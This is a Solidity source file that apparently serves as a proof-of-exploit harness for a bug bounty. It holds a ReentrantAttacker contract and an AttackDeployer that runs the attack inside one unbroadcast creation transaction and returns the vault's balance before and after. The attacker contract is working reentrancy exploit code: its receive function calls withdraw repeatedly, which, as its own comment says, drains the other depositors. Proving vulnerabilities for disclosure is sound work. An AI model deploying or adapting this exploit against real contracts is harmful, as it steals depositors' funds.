// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @notice Calls the unpublished creation needs. This file does not import the bounty app.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title ReentrantAttacker
/// @notice Helper deployed inside the unpublished creation transaction.
contract ReentrantAttacker {
    IVault public immutable vault;
    uint256 public immutable seed;

    constructor(IVault vault_, uint256 seed_) {
        vault = vault_;
        seed = seed_;
    }

    /// @dev Deposits `msg.value`, then withdraws. `receive` calls `withdraw` again while the
    ///      vault still holds at least `seed`, which drains the other depositors.
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= seed) {
            vault.withdraw();
        }
    }
}

/// @title AttackDeployer
/// @notice Creation bytecode of the single unpublished transaction.
///
/// The constructor deploys `ReentrantAttacker` and calls it. A constructor cannot
/// reenter itself, because the contract has no code until creation finishes.
/// The runtime bytecode is `abi.encode(pre, post)`: the vault balance before and after.
/// The prover appends `abi.encode(vault)` to this creation bytecode. Nothing here is broadcast.
contract AttackDeployer {
    constructor(IVault vault) payable {
        uint256 pre = address(vault).balance;
        ReentrantAttacker helper = new ReentrantAttacker(vault, msg.value);
        helper.attack{value: msg.value}();
        uint256 post = address(vault).balance;
        bytes memory out = abi.encode(pre, post);
        assembly {
            return(add(out, 0x20), mload(out))
        }
    }
}
